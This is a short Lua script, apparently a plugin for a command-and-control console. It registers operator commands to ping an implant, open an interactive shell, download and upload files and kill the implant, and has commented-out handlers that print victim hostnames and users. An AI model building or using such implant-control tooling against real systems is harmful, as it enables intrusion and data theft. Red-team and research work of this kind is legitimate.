CODE = {
    PING = 1,
    SSH = 2,
    DOWN = 3,
    UPL = 4,
    KILL = 5
}

function ping(payload)
    print("command ping from script args", payload)
    local err = addtask(CODE.PING, payload)
    if err then
        print("Error")
    end
end

function ssh(payload)
    print("command ssh from script with args", payload)
    local err = addtask(CODE.SSH, payload)
    if err then
        print("Error")
    end
end

function download(payload)
    print("command download from script with args", payload)
    local err = addtask(CODE.DOWN, payload)
    if err then
        print("Error")
    end
end

function upload(payload)
    local c = 0
    local lcs = {}
    for token in string.gmatch(payload, "[^%s]+") do 
        lcs[c] = token
        c=c+1
    end
    if #lcs ~= 1 then
        print("problem")
        return
    end

    local err = addtaskuploadfile(CODE.UPL, lcs[0], lcs[1])
    if err then
        print("Error")
    end
end

function kill(payload)
    print("command kill from script with args", payload)
    local err = addtask(CODE.KILL, payload)
    if err then
        print("Error")
    end
end

-- impl, name, desc, func
command("impl","ping","Ping the implant", ping)
command("impl","ssh","Get an interactive session", ssh)
command("impl","download","Download a file", download)
command("impl","upload","upload a file", upload)
command("impl","kill","Kill implant", kill)

--[[
function OnRegister(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
end

function OnCheck(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("data:", args[5])
    print("task:", args[6])
end

function OnResponse(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("response:", args[5])
    print("task:", args[6])
end
]]

function Main()
end
